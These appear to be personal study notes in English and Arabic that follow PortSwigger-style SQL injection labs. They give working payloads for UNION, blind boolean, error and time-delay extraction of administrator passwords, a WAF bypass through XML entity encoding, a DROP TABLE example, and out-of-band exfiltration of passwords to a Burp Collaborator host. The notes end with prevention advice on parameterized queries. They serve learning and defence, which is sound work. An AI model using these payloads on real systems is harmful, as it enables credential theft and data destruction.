![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/db988580-0771-4c4b-9924-907f93264b34/d0b84214-ce8d-47ec-ab65-7486538baf69/image.png)

## **Exploiting a mass assignment vulnerability**

logic
انت عندك 
jsion file 
هو الفيه الكميه
تروح تعمل واح فيه خصم 
حاول تجمع افكار مختلفه !!!!!!!!

{
"chosen_discount":{
"percentage":100
},
"chosen_products":[
{
"product_id":"1",
"quantity":1
}
]
}

## **Exploiting server-side parameter pollution in a REST URL**

VIP 
لازم تفتكر ال 
path travilsal
^_^

# **SQL injection**

## types

### IN-BAND

error     

  union

### INFERENTIAL(BLIND)

boolean

time delay

### OUT-OF-BAND

### **Second-order**

## **WHERE clause allowing retrieval of hidden data**

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Modify the category parameter, giving it the value '+OR+1=1--

exploit ::
 WHERE category = '' OR 1=1--' AND released = 1
 تذكر ان -- تعني الجي بعدي ملغي تعليق 
```

## **allowing login bypass**

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

WHERE username = 'administrator'--' AND password = 'bluecheese'
كدا دخل عشان هو طلب اليوزر و الباقي تعليق 

```

## **Determining the number of columns required**

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

## **Determining the number of columns required**

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

## **Database-specific syntax**

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

```
' UNION SELECT NULL FROM DUAL--
```

## **Finding columns with a useful data type**

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

## **Lab: SQL injection UNION attack, finding a column containing text**

1. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the `category` parameter:`'+UNION+SELECT+NULL,NULL,NULL--`
2. Try replacing each null with the random value provided by the lab, for example:`'+UNION+SELECT+'abcdef',NULL,NULL--`

## **Using a SQL injection UNION attack to retrieve interesting data**

In this example, you can retrieve the contents of the `users` table by submitting the input:

```
' UNION SELECT username, password FROM users--
```

## **Lab: SQL injection UNION attack, retrieving data from other tables**

1. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:`'+UNION+SELECT+'abc','def'--`
2. Use the following payload to retrieve the contents of the `users` table:`'+UNION+SELECT+username,+password+FROM+users--`

## **Retrieving multiple values within a single column**

```
' UNION SELECT username || '~' || password FROM users--
```

## **Lab: SQL injection UNION attack, retrieving multiple values in a single column**

1. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:`'+UNION+SELECT+NULL,'abc'--`
2. Use the following payload to retrieve the contents of the `users` table:`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

## **Querying the database type and version**

The following are some queries to determine the database version for some popular database types:

| Database type | Query |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

For example, you could use a `UNION` attack with the following input:

```
' UNION SELECT @@version--
```

## **Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**

1. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:`'+UNION+SELECT+'abc','def'#`
2. Use the following payload to display the database version:`'+UNION+SELECT+@@version,+NULL#`

## **Listing the contents of the database**

For example, you can query `information_schema.tables` to list the tables in the database:

SELECT * FROM information_schema.tables

You can then query `information_schema.columns` to list the columns in individual tables:

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

## **Lab: SQL injection attack, listing the database contents on non-Oracle databases**

1. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:`'+UNION+SELECT+'abc','def'--`
2. Use the following payload to retrieve the list of tables in the database:`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
3. Find the name of the table containing user credentials.
4. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
5. Find the names of the columns containing usernames and passwords.
6. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
7. Find the password for the `administrator` user, and use it to log in.

## **Blind SQL injection with conditional responses**

1. Modify the `TrackingId` cookie, changing it to:`TrackingId=xyz' AND '1'='1`
    
    Verify that the `Welcome back` message appears in the response.
    
2. Now change it to:`TrackingId=xyz' AND '1'='2`
    
    Verify that the `Welcome back` message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
    
3. Now change it to:`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
    
    Verify that the condition is true, confirming that there is a table called `users`.
    
4. Now change it to:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
5. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
6. Send a series of follow-up values to test different password lengths. Send:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='aTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
    
    Then send:
    
    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the `Welcome back` message disappears), you have determined the length of the password, which is in fact 20 characters long.
    
7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
8. In Burp Intruder, change the value of the cookie to:`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
9. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
10. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
11. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression `Welcome back`. To do this, click on the  **Settings** tab to open the **Settings** side panel. In the **Grep - Match** section, clear existing entries in the list, then add the value `Welcome back`.
12. Launch the attack by clicking the  **Start attack** button.
13. Review the attack results to find the value of the character at the first position. You should see a column in the results called `Welcome back`. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
14. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the **Intruder** tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:`TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`
15. Launch the modified attack, review the results, and note the character at the second offset.

## **Lab: Blind SQL injection with conditional errors**

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
2. Modify the `TrackingId` cookie, appending a single quotation mark to it:`TrackingId=xyz'`
    
    Verify that an error message is received.
    
3. Now change it to two quotation marks:`TrackingId=xyz''`Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
4. You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:`TrackingId=xyz'||(SELECT '')||'TrackingId=xyz'||(SELECT '' FROM dual)||'`
    
    In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
    
    As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all `SELECT` statements to explicitly specify a table name.
    
5. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:`TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
    
    This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
    
6. As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the `users` table exists, send the following query:`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    
    As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
    
7. You can also exploit this behavior to test conditions. First, submit the following query:`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Verify that an error message is received.
    
8. Now change it to:`TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The `CASE` statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions `1=1` and `1=2`, and an error is received when the condition is `true`.
    
9. You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username `administrator` exists:`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Verify that the condition is true (the error is received), confirming that there is a user called `administrator`.
    
10. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
11. Send a series of follow-up values to test different password lengths. Send:`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Then send:
    
    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
    
12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
13. Go to Burp Intruder and change the value of the cookie to:`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    This uses the `SUBSTR()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
14. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
15. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
16. Launch the attack by clicking the " Start attack" button.
17. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
18. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
19. Launch the modified attack, review the results, and note the character at the second offset.
20. Continue this process testing offset 3, 4, and so on, until you have the whole password.

## **Extracting sensitive data via verbose SQL error messages(CAST)**

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:

```
ERROR: invalid input syntax for type integer: "Example data"
```

This type of query may also be useful if a character limit prevents you from triggering conditional responses.

## **Lab: Visible error-based SQL injection**

1. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.`TrackingId=ogAZZfxtOKUELbuJ'`
2. In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
3. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:`TrackingId=ogAZZfxtOKUELbuJ'--`
4. Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
5. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:`TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
6. Send the request. Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
7. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
8. Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.
9. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
10. Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
11. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.`TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
12. Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
13. Modify the query to return only one row:`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
14. Send the request. Observe that the error message now leaks the first username from the `users` table:`ERROR: invalid input syntax for type integer: "administrator"`
15. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

## **Exploiting blind SQL injection by triggering time delays**

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

## **Lab: Blind SQL injection with time delays and information retrieval**

1. Modify the `TrackingId` cookie, changing it to:`TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application takes 10 seconds to respond.
    
2. Now change it to:`TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
    
    Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
    
3. Now change it to:`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
4. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
5. Send a series of follow-up values to test different password lengths. Send:`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    Then send:
    
    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
    
6. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
7. In Burp Intruder, change the value of the cookie to:`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
8. Place payload position markers around the `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
9. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
10. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the  **Resource pool** tab to open the **Resource pool** side panel and add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.
11. Launch the attack by clicking the  **Start attack** button.
12. Review the attack results to find the value of the character at the first position. You should see a column in the results called **Response received**. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
13. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the specified offset from 1 to 2. You should then see the following as the cookie value:`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
14. Launch the modified attack, review the results, and note the character at the second offset.
15. Continue this process testing offset 3, 4, and so on, until you have the whole password.

## **Exploiting blind SQL injection using out-of-band (OAST) techniques**

The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for Burp Collaborator.

The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This causes the database to perform a lookup for the following domain:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

## **Lab: Blind SQL injection with out-of-band interaction**

1. Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
2. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.

## **Exploiting blind SQL injection using out-of-band (OAST) techniques**

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

## **Lab: Blind SQL injection with out-of-band data exfiltration**

1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.

## **SQL injection in different contexts**

In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

This will be decoded server-side before being passed to the SQL interpreter.

## **Lab: SQL injection with filter bypass via XML encoding**

**Identify the vulnerability**

1. Observe that the stock check feature sends the `productId` and `storeId` to the application in XML format.
2. Send the `POST /product/stock` request to Burp Repeater.
3. In Burp Repeater, probe the `storeId` to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example:`<storeId>1+1</storeId>`
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
5. Try determining the number of columns returned by the original query by appending a `UNION SELECT` statement to the original store ID:`<storeId>1 UNION SELECT NULL</storeId>`
6. Observe that your request has been blocked due to being flagged as a potential attack.

**Bypass the WAF**

1. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select **Extensions > Hackvertor > Encode > dec_entities/hex_entities**.
2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.

**Craft an exploit**

1. Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns `0 units`, implying an error.
2. As you can only return one column, you need to concatenate the returned usernames and passwords, for example:`<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
3. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a `~` character.

## **Second-order SQL injection**

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.

Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.

Second-order SQL injection often occurs in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.

## Second-order SQL injection example

### **سيناريو توضيحي**:

1. **إدخال البيانات في الطلب الأول**:
    - المستخدم يقوم بإدخال مدخلات إلى التطبيق من خلال نموذج أو طلب HTTP. هذه المدخلات يتم تخزينها في قاعدة البيانات دون أن تكون هناك ثغرة في هذه النقطة.
    - على سبيل المثال، يمكن أن يكون المدخل اسم مستخدم في نموذج تسجيل جديد:
    
    ```sql
    sql
    Copy code
    INSERT INTO users (username, password) VALUES ('normalUser', 'password123');
    
    ```
    
2. **استخدام البيانات المخزنة في طلب آخر**:
    - في وقت لاحق، يقوم التطبيق باستخدام هذه البيانات المخزنة بطريقة غير آمنة في استعلام SQL آخر.
    - لنفترض أن التطبيق يقوم بإجراء تحديث على الحساب الخاص بالمستخدم ويسترجع اسم المستخدم من قاعدة البيانات ويُدمجه في استعلام SQL آخر. في هذه الحالة، إذا كانت البيانات تحتوي على حمولة SQL Injection، يمكن استغلالها هنا.

### **مثال عملي**:

1. **إدخال حمولة ضارة أثناء التسجيل**:
    - المستخدم يدخل حمولة SQL Injection أثناء التسجيل:
    
    ```sql
    sql
    Copy code
    '); DROP TABLE users;--
    
    ```
    
    - هذه المدخلات قد يتم تخزينها بشكل آمن في قاعدة البيانات في هذه النقطة، حيث يتم التأكد من سلامة المدخلات قبل تخزينها:
    
    ```sql
    sql
    Copy code
    INSERT INTO users (username, password) VALUES ('normalUser', 'password123');
    
    ```
    
2. **استغلال البيانات المخزنة في طلب لاحق**:
    - في طلب لاحق، يقوم التطبيق باسترجاع البيانات المخزنة، دون التحقق من صحتها، ويُدمجها في استعلام SQL آخر.
    - على سبيل المثال، في صفحة الحساب، يقوم التطبيق بدمج اسم المستخدم في استعلام SQL لجلب تفاصيل الحساب:
    
    ```sql
    sql
    Copy code
    SELECT * FROM users WHERE username = 'normalUser';
    
    ```
    
    - إذا كان اسم المستخدم المخزن يحتوي على حمولة SQL ضارة، يمكن أن يبدو الاستعلام النهائي كما يلي:
    
    ```sql
    sql
    Copy code
    SELECT * FROM users WHERE username = ''); DROP TABLE users;--';
    
    ```
    
    - هذا سيؤدي إلى تنفيذ حمولة SQL Injection المخزنة، مما يؤدي إلى حذف الجدول.

### **كيفية اكتشاف واستغلال هذه الثغرة:**

1. **إدخال حمولة SQL Injection في خطوة التسجيل أو إدخال البيانات**:
    - قم بإدخال حمولة SQL Injection ضارة في نموذج إدخال البيانات (مثل اسم المستخدم أو الحقل الآخر) الذي يتم تخزينه لاستخدامه لاحقًا.
    - مثال على حمولة بسيطة:
        
        ```sql
        sql
        Copy code
        '); DROP TABLE users;--
        
        ```
        
2. **التحقق من التنفيذ في وقت لاحق**:
    - بعد تخزين البيانات، حاول استرجاع هذه البيانات في طلب آخر (مثل استرجاع الملف الشخصي أو تسجيل الدخول). تحقق مما إذا كانت البيانات المخزنة تُدمج بطريقة غير آمنة في استعلام SQL آخر.
3. **تحليل استجابة التطبيق**:
    - إذا كانت الاستجابة تشير إلى وجود خطأ أو تصرف غير متوقع، فمن المحتمل أن التطبيق قد دمج البيانات المخزنة بطريقة غير آمنة مما أدى إلى تنفيذ الهجوم.

### **نقاط رئيسية للتصدي لهجمات Second-order SQL Injection**:

- **التحقق من المدخلات في جميع المراحل**:
    - من المهم التحقق من صحة البيانات ليس فقط عند تخزينها، ولكن أيضًا عند استرجاعها واستخدامها في أي استعلام لاحق.
- **استخدام استعلامات معدة مسبقًا (Prepared Statements)**:
    - من أفضل الممارسات استخدام استعلامات معدة مسبقًا لكل استعلام SQL لمنع تنفيذ حمولة SQL غير موثوقة.

## **How to prevent SQL injection**

You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".

The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

You can rewrite this code in a way that prevents the user input from interfering with the query structure:

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

You can use parameterized queries for any situation where untrusted input appears as data within the query, including the WHERE clause and values in an INSERT or UPDATE statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the ORDER BY clause. Application functionality that places untrusted data into these parts of the query needs to take a different approach, such as:

Whitelisting permitted input values.
Using different logic to deliver the required behavior.
For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant. It must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It's easy to make mistakes about the possible origin of data, or for changes in other code to taint trusted data.

## Secure Code Review EX

 

### 1. **In-band SQL Injection (حقن داخل النطاق)**:

**تعريف**:

